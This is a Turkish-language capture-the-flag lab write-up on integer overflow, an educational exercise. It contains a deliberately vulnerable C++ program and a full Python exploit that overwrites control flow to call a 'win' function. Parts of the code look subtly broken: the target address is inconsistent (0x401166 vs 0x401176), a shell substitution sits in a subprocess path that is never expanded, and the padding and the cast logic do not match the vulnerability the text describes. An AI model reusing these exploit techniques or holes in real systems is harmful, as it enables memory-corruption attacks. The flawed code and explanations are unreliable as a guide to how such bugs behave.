# CyberLabs: Integer Overflow Zafiyeti Laboratuvarı

**Modül Kodu:** CL-MEM-008

**Seviye:** Orta / İleri

**Konu:** Bellek Bozulması Zafiyetleri (Memory Corruption)

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, sık karşılaşılan bellek bozulması zafiyetlerinden biri olan **Integer Overflow** konusunu ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

- Integer overflow zafiyetinin temel nedenlerini ve yaşam döngüsünü anlamak.
- Bir integer değerin taşması sonucu belleğe nasıl erişildiğini pratik olarak gözlemlemek.
- `g++` ve `objdump` gibi araçlarla temel statik analiz ve derleme süreçlerini uygulamak.
- Kontrol edilen bir laboratuvar ortamında, programın kontrol akışını değiştirmeye yönelik temel bir exploit (sömürü kodu) geliştirmek.

## Senaryo
Laboratuvar senaryosu, iki ana bileşenden oluşmaktadır:

1. `vulnerable_code.cpp`: İçerisinde kasıtlı olarak 5 farklı integer overflow zafiyeti barındıran, C++ ile yazılmış hedef uygulama.
2. `exploit.py`: Zafiyetli uygulamadaki açıkları tetikleyerek programın akışını değiştiren ve önceden belirlenmiş bir fonksiyonu çağıran Python sömürü kodu.

## Disclaimer / Yasal Uyarı

The information provided in this blog post is intended for educational and informational purposes only. It is not intended to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

Bu blog yazısında sağlanan bilgiler yalnızca eğitim ve bilgilendirme amaçlıdır. Bilgisayar korsanlığı, siber saldırılar veya bilgisayar sistemlerine, ağlara veya verilere herhangi bir şekilde yetkisiz erişim de dahil olmak üzere herhangi bir yasa dışı veya etik olmayan faaliyeti teşvik etme veya reklamlama amacı taşımaz.

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır. Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir.

## Integer Overflow Zafiyeti Nedir?

Integer Overflow, Türkçesiyle **"Tamsayı Taşması"**, bir programın integer (tamsayı) değerlerini işlerken, değerin maksimum sınırını aşması durumunda ortaya çıkan kritik bir bellek yönetimi güvenlik açığıdır.

Bu zafiyet, genellikle aşağıdaki durumlarda ortaya çıkar:
- **Aritmetik işlemler** (toplama, çıkarma, çarpma)
- **Buffer boyutu hesaplamaları**
- **Array indeks hesaplamaları**
- **Bellek ayırma işlemleri**

Saldırganlar bu durumu, integer değerlerini manipüle ederek güvenlik kontrollerini atlatmak, buffer overflow'a neden olmak veya programın kontrolünü ele geçirmek için kullanabilirler.

Başarılı bir istismar, programın çökmesine, hassas verilerin sızdırılmasına veya sistemin kontrolünün tamamen ele geçirilmesine yol açabilir.

## Zorluk Seviyeleri

## 🟢 **KOLAY YOL: Debug Sembolleri ile**
```bash
# test_lab.sh dosyasında -g flag'ini ekleyin
g++ -o compiled/vulnerable_code source_code/vulnerable_code.cpp -g -fno-stack-protector
```
- Debug sembolleri ile daha kolay analiz
- GDB'de `p &variable` komutları çalışır
- Eğitim amaçlı ideal

## 🔴 **ZOR YOL: Debug Sembolleri Olmadan (Varsayılan)**
```bash
# Mevcut derleme (debug sembolleri yok)
g++ -o compiled/vulnerable_code source_code/vulnerable_code.cpp -fno-stack-protector
```
- Gerçek dünyaya daha yakın
- `info functions`, `disassemble` komutları gerekir
- Production binary'lerde debug sembolleri yoktur

## Kurulum ve Çalıştırma Adımları

**Örnek Kod İncelemesi**

Şimdi adım adım örnek bir kod yazalım ve zafiyeti istismar edelim. Öncelikle zafiyetli programımızı yazalım:

```cpp
#include <iostream>
#include <cstring>
#include <climits>
#include <unistd.h>

void win_function() {
    std::cout << "\n--- Zafiyet Basariyla Somuruldu! ---\n" << std::endl;
    std::cout << "\n🎉 CTF FLAG: CyberLabs{Integer_Overflow_Success} 🎉" << std::endl;
}

// Integer overflow zafiyeti 1: Buffer boyutu hesaplama hatası
void vulnerable_function_1() {
    char buffer[64];
    int size;
    
    std::cout << "Buffer boyutu girin (0-100): ";
    std::cin >> size;
    
    // Integer overflow: Negatif değer girilirse unsigned'a cast edilir
    // Örnek: -1 -> 0xFFFFFFFF (çok büyük pozitif sayı)
    if (size < 0) {
        std::cout << "Negatif boyut! Güvenlik kontrolü atlanıyor..." << std::endl;
        size = (unsigned int)size; // Bu satır zafiyet yaratır
    }
    
    if (size > 100) {
        std::cout << "Çok büyük boyut!" << std::endl;
        return;
    }
    
    std::cout << "Veri girin: ";
    // Buffer overflow: size çok büyük olabilir
    read(0, buffer, size);
    buffer[size] = '\0'; // Null terminator - potansiyel overflow
    
    std::cout << "Girilen veri: " << buffer << std::endl;
}
```

Burada **"size"** değeri negatif girildiğinde unsigned'a cast edilerek çok büyük pozitif sayıya dönüşür. Aslında zafiyetin temel mantığı da burada anlaşılabilir. Amaç, integer değerlerini manipüle ederek güvenlik kontrollerini atlatmaktır.

Halen anlamadıysanız daha basit bir koda da bakabilirsiniz. Ayrıca bu kodla diğer kod için **PADDING_SIZE'da** hesaplayabilirsiniz.

```cpp
#include <iostream>
#include <climits>

int main() {
    int size = -1;
    unsigned int unsigned_size = (unsigned int)size;
    
    std::cout << "Orijinal değer: " << size << std::endl;
    std::cout << "Unsigned cast: " << unsigned_size << std::endl;
    std::cout << "Hex değer: 0x" << std::hex << unsigned_size << std::endl;
    
    return 0;
}
```

*Integer Overflow Örneği (-1 -> 0xFFFFFFFF)*

Artık kodu derleyebiliriz. Kodu derlemek için **"-fno-stack-protector"** kullanmalıyız. Bu tag'i kullanma nedenimiz stack canary korumasını kapatmamız gerekiyor. Böylece integer overflow'dan kaynaklanan buffer overflow'ları daha kolay gözlemleyebiliriz.

**"-g"** kullanma sebebimiz ise ilerleyen aşamalarda zafiyeti incelemek için GDB adlı program ile debugging yapacağımız için debug sırasında değişkenlerin görünmesidir.

```bash
g++ -o vulnerable_code vulnerable_code.cpp -fno-stack-protector -g
```

**Dostlar buraya kadar anlaşılması çok önemlidir. Anlamadıysanız yeniden kodları okuyun. Bu kodu anlamadan devamını anlayamazsınız. Bu noktadan sonra artık zafiyetin sömürülme aşamasına başlıyoruz.**

## Zafiyet Türleri

### 1. Buffer Boyutu Hesaplama Hatası
- **Zafiyet:** Negatif değer girilerek unsigned cast ile büyük pozitif sayı elde etme
- **Sonuç:** Buffer overflow ve bellek bozulması
- **Örnek:** `-1` girilerek `0xFFFFFFFF` (4GB) buffer boyutu elde etme

### 2. Aritmetik Overflow (Toplama)
- **Zafiyet:** İki büyük pozitif sayının toplamının taşması
- **Sonuç:** Negatif sonuç ve güvenlik kontrollerinin atlanması
- **Örnek:** `INT_MAX + 1` = negatif değer

### 3. Array Bounds Bypass
- **Zafiyet:** Büyük pozitif sayı girilerek negatif indeks elde etme
- **Sonuç:** Array sınırları dışına erişim
- **Örnek:** `UINT_MAX` girilerek `-1` indeks elde etme

### 4. Multiplication Overflow
- **Zafiyet:** İki büyük sayının çarpımının taşması
- **Sonuç:** Negatif sonuç ve bellek ayırma hatası
- **Örnek:** `65537 * 65537` = overflow

### 5. Subtraction Underflow
- **Zafiyet:** `end < start` yaparak negatif uzunluk elde etme
- **Sonuç:** Negatif uzunluk ve bellek işlemleri
- **Örnek:** `start=10, end=5` = `-5` uzunluk

### Exploit Geliştirme Aşaması

Öncelikle **"win_function"** fonksiyonunun bellek konumunu statik olarak bulmamız gerekiyor. Bunun için aşağıdaki komutu kullanacağız:

```bash
objdump -t ./compiled/$(uname -m)/vulnerable_code | grep win_function
```

Aşağıdaki komutu çalıştırdıktan sonra gelen çıktıyı beraber inceleyelim:

*Bellek Adresi Tespiti*

Çıktıya baktığımızda ilgili değişkenin **".text"** alanında **"0x401166"** bellek adresinde depolandığını statik olarak tespit ediyoruz. Yani bu değer bir noktada integer overflow ile manipüle ediliyor ve kontrol akışı değiştiriliyor.

Şimdi ilgili zafiyetli değişkenin padding size'ını tespit etmeliyiz ki o kadar uzunlukta bir veriyle dolduralım. Bunun için sizler kolay yoldan bu kodla çözebilirsiniz.

```cpp
#include <iostream>
#include <cstddef>

typedef struct {
    char buffer[64];
    int size;
} VulnerableStruct;

int main() {
    printf("Boyut (sizeof(VulnerableStruct)): %zu byte\n", sizeof(VulnerableStruct));
    printf("size'nin baslangic konumu (offsetof): %zu byte\n", offsetof(VulnerableStruct, size));
    return 0;
}
```

*PADDING SIZE hesaplama*

Şimdi GDB ile incelemeye başlıyoruz. Bunun için **"gdb vulnerable_code"** komutunu kullanıyoruz.

Ardından **"list main"** komutuyla kodlarımızı görüntülüyoruz:

*GDB ile Kodların Görüntülenmesi*

Kodları görüntüledikten sonra daha önce hesapladığımız integer overflow için bir payload oluşturmamız gerekiyor. Bu aşamada şöyle bir Python scripti ile değeri oluşturabiliriz.

```python
import struct
PADDING_SIZE = 64 # Buffer boyutu
TARGET_ADDRESS = 0x401176 # Hesaplanan Hedef Adres
payload = b'A' * PADDING_SIZE + struct.pack("<Q", TARGET_ADDRESS)
with open("payload.bin", "wb") as f: f.write(payload)
print("'payload.bin' oluşturuldu.")
```

Ardından GDB'ye geri dönüyoruz ve "break vulnerable_function_1" yazıyoruz. Böylece ilgili fonksiyonda kod duracaktır.

*Breakpoint Ataması*

PADDING_SIZE değerini yavaş yavaş arttırıyoruz ve GDB üzerinden **"run < payload.bin"** komutuyla denemeye başlıyoruz.

*Enjeksiyon Denemesi - 1*

Bu aşamada integer overflow'un tetiklendiğini görüyoruz. Şimdi değerlerimiz oluşmuş mu diye bakmak için öncelikle değerin yerini bulmak için **"print size"** komutunu çalıştırıyoruz. Burada çıkan değeri bir yere not alıyoruz.

*Değişken Yerini Bulma*

Şimdi en önemli aşamadayız "x/16gx DEGER" şeklinde komutu çalıştırıyoruz. Bu komutun manası ise **"belleği incele (x), 16 birimlik değer göster (/16), giant word formatında göster (her biri 8 bit, g) ve hex olarak göster (x)"** diyoruz.

*Zafiyetin Tespiti*

**BINGO!** Zafiyeti başarıyla tespit etmiş bulunuyoruz. Artık hesaplamaya geçiyoruz. Bu değerlere göre integer overflow'un nasıl çalıştığını görebiliriz.

Şimdi tüm bu bilgilerle sömürü kodumuzu yazmaya başlıyoruz. Ben sömürü kodu için Python dilini kullanıyorum. Sizler farklı dillerde yazabilirsiniz.

Statik değişkenlerimizi belirleyelim:

```python
# Zafiyetli programın adı
VICTIM_PROGRAM = "./compiled/$(uname -m)/vulnerable_code"

# objdump ile bulduğumuz statik adres.
HARDCODED_ADDRESS = 0x401166
# Padding boyutumuz
PADDING_SIZE = 64
```

Ardından programı başlatan kodu yazıyoruz:

```python
try:
    p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except FileNotFoundError:
    print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C++ kodunu derlediniz mi?")
    sys.exit(1)
```

Şimdi payloadlarımızı hazırlayan aşamayı yazıyoruz:

```python
padding = b'A' * PADDING_SIZE
overwrite_address = struct.pack("<Q", HARDCODED_ADDRESS)
payload = padding + overwrite_address
print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
print("[*] Payload kurban programa gonderiliyor...")
```

Ardından enjekte ettiğimiz fonksiyonun çıktılarını kontrol ettiğimiz aşamayı yazıyoruz:

```python
stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)

stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

print("\n--- Kurban Programdan Gelen Cikti ---")
print(stdout_output)
print("--- Kurbandan Gelen Hata Ciktisi (varsa) ---")
print(stderr_output)
print("--- Exploit Tamamlandi ---")

if "Zafiyet Basariyla Somuruldu" in stdout_output:
    print("\n[+] Zafiyet basariyla istismar edildi!")
else:
    print("\n[-] Istismar basarisiz oldu.")
```

Ve sömürü kodumuzu çalıştırdığımızda başarıyla fonksiyonu enjekte ettiğimizi görüyoruz.

*Sömürünün Başarılı Olması*

## Hızlı Başlangıç

### Gereksinimler
```bash
# Linux
sudo apt-get update
sudo apt-get install g++ build-essential python3

# macOS
xcode-select --install
brew install python3

# Python paketleri
pip3 install pwntools
```

### Derleme ve Test
```bash
# Laboratuvarı derle
./compile_linux.sh

# Test et
./test_lab.sh

# İnteraktif modda çalıştır
./compiled/$(uname -m)/vulnerable_code

# Exploit scriptini çalıştır
python3 source_code/exploit.py
```

### Sömürü Kodunun Tam Hali

```python
import struct
import subprocess
import sys

# Zafiyetli programın adı
VICTIM_PROGRAM = "./compiled/$(uname -m)/vulnerable_code"

# 1. Adım'da objdump ile bulduğumuz ve HİÇ DEĞİŞMEYECEK olan statik adres.
# Siz de kendi sisteminizde bulduğunuz adresi buraya yazmalısınız!
HARDCODED_ADDRESS = 0x401166

PADDING_SIZE = 64

def main():
    print("--- [SALDIRGAN] Python Exploit (Statik Adres ile) Baslatildi ---")
    
    try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C++ kodunu derlediniz mi?")
        sys.exit(1)
        
    print(f"[*] Hedef adres statik olarak biliniyor: {hex(HARDCODED_ADDRESS)}")
    
    # Payload'ı SABİT adres ile oluştur
    padding = b'A' * PADDING_SIZE
    overwrite_address = struct.pack("<Q", HARDCODED_ADDRESS)
    payload = padding + overwrite_address
    
    print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
    print("[*] Payload kurban programa gonderiliyor...")
    
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Kurban Programdan Gelen Cikti ---")
    print(stdout_output)
    print("--- Kurbandan Gelen Hata Ciktisi (varsa) ---")
    print(stderr_output)
    print("--- Exploit Tamamlandi ---")
    
    if "Zafiyet Basariyla Somuruldu" in stdout_output:
        print("\n[+] Zafiyet basariyla istismar edildi!")
    else:
        print("\n[-] Istismar basarisiz oldu.")

if __name__ == "__main__":
    main()
```

Okuduğunuz için teşekkür ederim!
